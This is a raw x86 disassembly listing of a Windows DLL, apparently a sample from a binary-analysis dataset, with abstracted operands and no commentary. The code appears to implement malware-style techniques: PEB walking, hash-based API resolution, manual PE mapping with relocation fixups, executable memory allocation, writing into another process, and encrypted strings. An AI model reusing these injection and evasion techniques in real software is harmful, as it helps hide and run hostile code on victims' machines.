sub_1000100c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x1a
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_10001128 ]
mov esi r--data
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
pop esi
pop ebp
retn
push 0x0
push r--data
push esi
call sub_10002a96
pop ecx
push eax
push esi
call sub_10002ab5
add esp 0x10
jmp r-xdata
sub_10001194
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp eax 0x65
jg r-xdata
mov ecx 0xc9
cmp eax ecx
jg r-xdata
je r-xdata
mov ecx 0x191
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
cmp eax 0x1b
ja r-xdata
mov ecx 0x197
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add eax 0xffffff9a
cmp eax 0x9
ja r-xdata
push 0x0
push r--data
push esi
call sub_10002a96
pop ecx
push eax
push esi
call sub_10002ab5
add esp 0x10
xor eax eax
jmp r-xdata
jmp [ eax * 4 + jump_table_100014c0 ]
sub eax 0x1f5
je r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add ecx 0xffffffa0
cmp eax ecx
jg r-xdata
jmp [ eax * 4 + jump_table_10001530 ]
pop esi
pop ebp
retn
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
sub eax 0x64
je r-xdata
mov esi r--data
jmp r-xdata
sub eax 0x192
je r-xdata
sub eax 0x132
je r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
sub eax 0xca
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
sub eax 0x63
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
sub_1000155f
push ebp
mov ebp esp
mov eax [ fs : 0x30 ]
push esi
push edi
mov edi [ eax + 0xc ]
add edi 0xc
mov esi [ edi ]
jmp r-xdata
cmp esi edi
jne r-xdata
movzx eax [ esi + 0x2c ]
push 0x1
push eax
push [ esi + 0x30 ]
call sub_10002e94
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
xor eax eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov esi [ esi ]
pop edi
pop esi
pop ebp
retn
sub_100015b6
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
push 0x2e
push edi
call sub_10002c37
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
sub eax edi
push eax
push edi
call sub_10002cc9
push r--data
push r--data
push eax
mov [ ebp + 0x8 ] eax
call sub_10002cef
push [ ebp + 0x8 ]
mov edi eax
call sub_10001f78
add esp 0x18
inc esi
cmp [ esi ] 0x23
jne r-xdata
pop edi
pop ebp
retn
push 0x0
push 0x0
push esi
call sub_10002ef3
push eax
push 0x0
push edi
call sub_100017e4
add esp 0x18
inc esi
push esi
call sub_10002c16
push eax
push 0x0
push edi
call sub_100017e4
add esp 0x10
jmp r-xdata
sub_10001650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x239
ja r-xdata
xor al al
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax * 4 + rw-data ] ecx
mov al 0x1
pop ebp
retn
sub_10001673
push ebp
mov ebp esp
push 0x7
call sub_10001634
mov edx eax
pop ecx
test edx edx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edx
pop ebp
retn
push 0x1fc0eaee
push 0x1
push eax
call sub_100017e4
mov edx eax
push edx
push 0x7
call sub_10001650
add esp 0x14
sub_100016a8
push ebp
mov ebp esp
sub esp 0x20
push 0x2
call sub_10001634
mov edx eax
pop ecx
test edx edx
jne r-xdata
push [ ebp + 0x8 ]
call edx
leave
retn 0x4
push edi
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] al
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0xa2a17128
mov [ ebp - 0xc ] 0x2c821fb0
mov [ ebp - 0x8 ] 0x2729fc95
call sub_10002a96
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10001d11
lea eax [ ebp - 0x20 ]
push eax
call sub_10002a96
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10002f99
push eax
call sub_10003c90
call sub_1000159c
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call sub_10001673
mov edx eax
push edx
push 0x2
call sub_10001650
add esp 0x1c
pop edi
sub_10001737
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x3c ]
lea eax [ eax + ecx + 0x18 ]
push ebx
push esi
mov esi [ eax + 0x60 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
shr eax 0x10
add esi ecx
push edi
test ax ax
jne r-xdata
xor eax eax
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
add edi ecx
add ebx ecx
cmp [ esi + 0x18 ] 0x0
jbe r-xdata
movzx eax [ ebp + 0xc ]
sub eax [ esi + 0x10 ]
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
test eax eax
jns r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push 0x0
add eax ecx
push 0x0
push eax
call sub_10002ef3
add esp 0xc
cmp eax [ ebp + 0xc ]
je r-xdata
mov edx [ esi + 0x1c ]
lea eax [ edx + eax * 4 ]
mov eax [ eax + ecx ]
add eax ecx
cmp eax esi
jbe r-xdata
movzx eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add edi 0x4
add ebx 0x2
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x18 ]
jb r-xdata
mov ecx eax
sub ecx esi
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
push eax
call sub_100015b6
pop ecx
sub_100017e4
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] esi
jne r-xdata
call sub_1000159c
mov esi eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10001876
mov esi eax
pop ecx
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000100c
pop ecx
mov [ ebp + 0x8 ] eax
test esi esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_100016a8
mov esi eax
cmp [ ebp + 0x8 ] esi
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10001737
pop ecx
pop ecx
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
sub_10001844
push ebp
mov ebp esp
push [ ebp + 0x14 ]
call sub_10001634
mov edx eax
pop ecx
test edx edx
jne r-xdata
mov eax edx
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100017e4
mov edx eax
push edx
push [ ebp + 0x14 ]
call sub_10001650
add esp 0x14
sub_10001893
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn
push esi
push edi
pop edi
pop esi
add ecx 0xfffffff8
xor edi edi
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
add eax [ eax + 0x4 ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
movzx esi [ edx ]
mov ecx esi
and ecx 0xfff
add ecx [ eax ]
shr si 0xc
cmp si 0x3
je r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
add ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
add [ ecx ] esi
cmp si 0xa
jne r-xdata
mov ecx [ eax + 0x4 ]
sub ecx 0x8
add edx 0x2
inc edi
shr ecx 0x1
cmp edi ecx
jb r-xdata
sub_100018fe
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and eax 0xffff0000
mov edx 0x1000
mov eax sub_100018fe
sub eax edx
jmp r-xdata
mov ecx [ eax + 0x3c ]
cmp ecx edx
jge r-xdata
mov ecx 0x5a4d
cmp [ eax ] cx
jne r-xdata
cmp [ ecx + eax ] 0x4550
je r-xdata
pop ebp
retn 0x4
sub_10001939
push ebp
mov ebp esp
push ebx
push 0x11
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0x9
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x11
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_1000198f
push ebp
mov ebp esp
push ebx
push 0x19
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0xa
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x19
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_100019f7
push ebp
mov ebp esp
push ebx
push 0x26
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0x2
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x26
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10001a5c
push ebp
mov ebp esp
push ebx
push 0x28
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0x1
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x28
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10001abe
push ebp
mov ebp esp
push ebx
push 0x2d
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0x8
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x2d
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10001b14
push ebp
mov ebp esp
push ebx
push 0x5a
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0xb
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x5a
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10001b70
push ebp
mov ebp esp
push ecx
push esi
mov esi 0x1a4
push esi
call sub_10001634
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp - 0x4 ]
pop esi
leave
retn
push ebx
push edi
push 0x5
call sub_1000100c
push 0x65
mov edi eax
call sub_10001194
push edi
mov ebx eax
call sub_10001876
push ebx
push eax
call sub_10001673
push edi
mov [ ebp - 0x4 ] eax
call sub_10001f78
push ebx
call sub_10001f78
push [ ebp - 0x4 ]
push esi
call sub_10001650
add esp 0x24
pop edi
pop ebx
sub_10001bea
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0xc ]
call sub_100018fe
mov ebx eax
mov esi [ ebx + 0x3c ]
mov eax [ esi + ebx + 0x50 ]
xor edi edi
push edi
push eax
push edi
push 0x40
push edi
push 0xffffffff
mov [ ebp - 0x8 ] eax
call sub_100019f7
push edi
push edi
push edi
push 0x2
push eax
mov [ ebp - 0x10 ] eax
call sub_10001a5c
add esp 0x2c
mov [ ebp - 0xc ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x8 ]
push ebx
push eax
call sub_10001d11
or [ ebp - 0x18 ] 0xffffffff
push 0x40
push edi
push 0x1
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
push [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edi
call sub_10001b70
add esp 0x34
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x18 ]
push [ esi + ebx + 0xa4 ]
mov eax [ ebp - 0x4 ]
sub eax ebx
push eax
mov eax [ esi + ebx + 0xa0 ]
push [ ebp - 0xc ]
add eax ebx
push eax
call sub_10001893
mov esi [ ebp - 0x4 ]
sub esi ebx
add esp 0x10
add esi [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0xc ]
call sub_10001abe
push [ ebp - 0x10 ]
call sub_10001939
pop ecx
pop ecx
mov eax esi
sub_10001cb3
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x43a
call sub_10001b14
push [ ebp + 0xc ]
mov esi eax
push esi
call sub_10001bea
add esp 0x14
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10001939
pop ecx
pop esi
mov al bl
pop ebx
pop ebp
retn
push ebx
push ebx
push [ ebp + 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_1000198f
add esp 0x1c
test eax eax
setne bl
sub_10001d11
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx esi
je r-xdata
sub edx esi
mov al [ edx + ecx ]
dec [ ebp + 0x10 ]
mov [ ecx ] al
inc ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_10001d41
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov cl [ ebp + 0xc ]
dec [ ebp + 0x10 ]
mov [ eax ] cl
inc eax
sub_10001d5e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
push esi
cmp ecx eax
je r-xdata
or eax 0xffffffff
mov esi [ ebp + 0xc ]
cmp esi eax
je r-xdata
push edi
xor edi edi
cmp [ ebp + 0x10 ] eax
jbe r-xdata
pop edi
jmp r-xdata
sub esi ecx
push ebx
pop esi
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
ja r-xdata
pop ebx
xor eax eax
inc eax
inc ecx
inc edi
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov dl [ ecx ]
mov bl [ esi + ecx ]
cmp dl bl
jb r-xdata
jmp r-xdata
sub_10001da3
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov esi 0x93
push esi
call sub_10001634
mov edi eax
pop ecx
test edi edi
jne r-xdata
call edi
pop edi
pop esi
leave
retn
mov [ ebp - 0x20 ] al
mov [ ebp - 0x2 ] al
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0x96b47b23
mov [ ebp - 0xc ] 0x3b83198e
mov [ ebp - 0x8 ] 0x318fd87
mov [ ebp - 0x4 ] 0x26dd
call sub_10002a96
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10001d11
lea eax [ ebp - 0x20 ]
push eax
call sub_10002a96
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_10002f99
push eax
call sub_10003c90
call sub_1000159c
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call sub_10001673
mov edi eax
push edi
push esi
call sub_10001650
add esp 0x1c
sub_10001e3a
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov esi 0x94
push esi
call sub_10001634
mov edi eax
pop ecx
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
pop edi
pop esi
leave
retn
mov [ ebp - 0x18 ] al
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x318c1abd
mov [ ebp - 0x4 ] 0x97
call sub_10002a96
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10001d11
lea eax [ ebp - 0x18 ]
push eax
call sub_10002a96
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10002f99
push eax
call sub_10003c90
call sub_1000159c
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call sub_10001673
mov edi eax
push edi
push esi
call sub_10001650
add esp 0x1c
sub_10001ece
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov esi 0x97
push esi
call sub_10001634
mov edi eax
pop ecx
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call edi
pop edi
pop esi
leave
retn 0xc
mov [ ebp - 0x18 ] al
mov [ ebp - 0x4 ] al
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x3b8504ba
call sub_10002a96
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10001d11
lea eax [ ebp - 0x18 ]
push eax
call sub_10002a96
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_10002f99
push eax
call sub_10003c90
call sub_1000159c
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call sub_10001673
mov edi eax
push edi
push esi
call sub_10001650
add esp 0x1c
sub_10001f78
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001da3
push eax
call sub_10001ece
pop ebp
retn
sub_10001f97
push ebp
mov ebp esp
push ecx
push esi
mov esi 0x95
push esi
call sub_10001634
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp - 0x4 ]
pop esi
leave
retn
push ebx
push edi
push 0x1
call sub_1000100c
push 0xf
mov edi eax
call sub_10001194
push edi
mov ebx eax
call sub_10001876
push ebx
push eax
call sub_10001673
push edi
mov [ ebp - 0x4 ] eax
call sub_10001f78
push ebx
call sub_10001f78
push [ ebp - 0x4 ]
push esi
call sub_10001650
add esp 0x24
pop edi
pop ebx
sub_10002011
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0xc ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
push 0x8
call sub_10001da3
push eax
call sub_10001f97
add esp 0x10
pop ebp
retn
push 0x8
call sub_10001da3
push eax
call sub_10001e3a
add esp 0xc
pop ebp
retn
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001da3
push eax
call sub_10001ece
sub_10002063
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
add esp 0x48
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
mov esi rw-data
push esi
call sub_10001d41
push [ ebp + 0x8 ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_10001d11
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002a96
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_10001d11
push [ ebp + 0x14 ]
call sub_10002a96
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_10001d11
push [ ebp + 0x18 ]
call sub_10002a96
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_10001d11
push [ ebp + 0x1c ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_10001d11
push [ ebp + 0x20 ]
call sub_10002a96
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_10001d11
push [ ebp + 0x24 ]
call sub_10002a96
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_10001d11
push [ ebp + 0x28 ]
call sub_10002a96
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_10001d11
push [ ebp + 0x2c ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_10001d11
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002a96
push eax
push [ ebp + 0x34 ]
push esi
call sub_10001d11
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002a96
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_10001d11
add esp 0x10
pop ebx
pop ebp
retn
sub_1000224f
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
add esp 0x48
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_10001d41
push esi
push ebx
push rw-data
call sub_10001d41
push esi
push ebx
mov esi rw-data
push esi
call sub_10001d41
push [ ebp + 0x8 ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_10001d11
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002a96
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_10001d11
push [ ebp + 0x14 ]
call sub_10002a96
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_10001d11
push [ ebp + 0x18 ]
call sub_10002a96
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_10001d11
push [ ebp + 0x1c ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_10001d11
push [ ebp + 0x20 ]
call sub_10002a96
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_10001d11
push [ ebp + 0x24 ]
call sub_10002a96
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_10001d11
push [ ebp + 0x28 ]
call sub_10002a96
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_10001d11
push [ ebp + 0x2c ]
call sub_10002a96
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_10001d11
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002a96
push eax
push [ ebp + 0x34 ]
push esi
call sub_10001d11
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002a96
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_10001d11
add esp 0x10
pop ebx
pop ebp
retn
sub_1000243b
push ebp
mov ebp esp
push 0x1e3
push 0x8593dd7
push 0x8
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002467
push ebp
mov ebp esp
push 0x1d7
push 0x1ad09c78
push 0x8
push 0x0
call sub_10001844
add esp 0x10
